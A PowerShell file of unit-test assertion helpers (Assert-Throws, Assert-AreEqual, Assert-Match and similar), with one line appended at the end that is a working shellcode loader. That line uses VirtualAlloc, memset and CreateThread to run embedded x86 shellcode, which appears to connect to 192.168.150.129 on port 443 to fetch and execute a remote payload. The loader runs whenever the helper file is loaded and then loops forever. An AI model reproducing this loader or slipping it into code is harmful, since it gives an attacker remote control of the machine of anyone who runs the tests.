




















function Assert-Throws
{
  param([ScriptBlock] $script, [string] $message)
  try
  {
    &$script
  }
  catch
  {
    if ($message -ne "")
    {
      $actualMessage = $_.Exception.Message
      Write-Output ("Caught exception: '$actualMessage'")

      if ($actualMessage -eq $message)
      {
        return $true;
      }
      else
      {
        throw "Expected exception not received: '$message' the actual message is '$actualMessage'";
      }
    }
    else
    {
      return $true;
    }
  }

  throw "No exception occurred";
}








function Assert-ThrowsContains
{
  param([ScriptBlock] $script, [string] $compare)
  try
  {
    &$script
  }
  catch
  {
    if ($message -ne "")
    {
      $actualMessage = $_.Exception.Message
      Write-Output ("Caught exception: '$actualMessage'")
      if ($actualMessage.Contains($compare))
      {
        return $true;
      }
      else
      {
        throw "Expected exception does not contain expected text '$compare', the actual message is '$actualMessage'";
      }
    }
    else
    {
      return $true;
    }
  }

  throw "No exception occurred";
}








function Assert-ThrowsLike
{
  param([ScriptBlock] $script, [string] $compare)
  try
  {
    &$script
  }
  catch
  {
    if ($message -ne "")
    {
      $actualMessage = $_.Exception.Message
      Write-Output ("Caught exception: '$actualMessage'")
      if ($actualMessage -like $compare)
      {
        return $true;
      }
      else
      {
        throw "Expected exception is not like the expected text '$compare', the actual message is '$actualMessage'";
      }
    }
    else
    {
      return $true;
    }
  }

  throw "No exception occurred";
}


function Assert-Env
{
   param([string[]] $vars)
   $tmp = Get-Item env:
   $env = @{}
   $tmp | % { $env.Add($_.Key, $_.Value)}
   $vars | % { Assert-True {$env.ContainsKey($_)} "Environment Variable $_ Is Required.  Please set the value before running the test"}
}








function Assert-True
{
  param([ScriptBlock] $script, [string] $message)

  if (!$message)
  {
    $message = "Assertion failed: " + $script
  }

  $result = &$script
  if (-not $result)
  {
    Write-Debug "Failure: $message"
    throw $message
  }

  return $true
}








function Assert-False
{
  param([ScriptBlock] $script, [string] $message)

  if (!$message)
  {
    $message = "Assertion failed: " + $script
  }

  $result = &$script
  if ($result)
  {
    throw $message
  }

  return $true
}








function Assert-NotNull
{
  param([object] $actual, [string] $message)

  if (!$message)
  {
    $message = "Assertion failed because the object is null: " + $actual
  }

  if ($actual -eq $null)
  {
    throw $message
  }

  return $true
}








function Assert-Exists
{
    param([string] $path, [string] $message)
  return Assert-True {Test-Path $path} $message
}









function Assert-AreEqual
{
    param([object] $expected, [object] $actual, [string] $message)

  if (!$message)
  {
      $message = "Assertion failed because expected '$expected' does not match actual '$actual'"
  }

  if ($expected -ne $actual)
  {
      throw $message
  }

  return $true
}









function Assert-NumAreInRange
{
	param([long] $expected, [long] $actual, [long] $interval, [string] $message)
	if (!$message)
	{
		$message = "Assertion failed because expected '$expected' does not fall in accepted range of 'interval' of actual '$actual'"
	}
	if(!($actual -ge ($expected-$interval) -and $actual -le ($expected+$interval)))
	{
        throw $message
    }
	return $true
}








function Assert-AreEqualArray
{
    param([object] $expected, [object] $actual, [string] $message)

  if (!$message)
  {
      $message = "Assertion failed because expected '$expected' does not match actual '$actual'"
  }

  $diff = Compare-Object $expected $actual -PassThru

  if ($diff -ne $null)
  {
      throw $message
  }

  return $true
}









function Assert-AreEqualObjectProperties
{
  param([object] $expected, [object] $actual, [string] $message)

  $properties = $expected | Get-Member -MemberType "Property" | Select -ExpandProperty Name
  $diff = Compare-Object $expected $actual -Property $properties

  if ($diff -ne $null)
  {
      if (!$message)
      {
          $message = "Assert failed because the objects don't match. Expected: " + $diff[0] + " Actual: " + $diff[1]
      }

      throw $message
  }

  return $true
}








function Assert-Null
{
    param([object] $actual, [string] $message)

  if (!$message)
  {
      $message = "Assertion failed because the object is not null: " + $actual
  }

  if ($actual -ne $null)
  {
      throw $message
  }

  return $true
}









function Assert-AreNotEqual
{
    param([object] $expected, [object] $actual, [string] $message)

  if (!$message)
  {
      $message = "Assertion failed because expected '$expected' does match actual '$actual'"
  }

  if ($expected -eq $actual)
  {
      throw $message
  }

  return $true
}









function Assert-StartsWith
{
    param([string] $expectedPrefix, [string] $actual, [string] $message)

  Assert-NotNull $actual

  if (!$message)
  {
      $message = "Assertion failed because actual '$actual' does not start with '$expectedPrefix'"
  }

  if (-not $actual.StartsWith($expectedPrefix))
  {
      throw $message
  }

  return $true
}









function Assert-Match
{
    param([string] $regex, [string] $actual, [string] $message)

  Assert-NotNull $actual

  if (!$message)
  {
      $message = "Assertion failed because actual '$actual' does not match '$regex'"
  }

  if (-not $actual -Match $regex >$null)
  {
      throw $message
  }

  return $true
}









function Assert-NotMatch
{
    param([string] $regex, [string] $actual, [string] $message)

  Assert-NotNull $actual

  if (!$message)
  {
      $message = "Assertion failed because actual '$actual' does match '$regex'"
  }

  if ($actual -Match $regex >$null)
  {
      throw $message
  }

  return $true
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

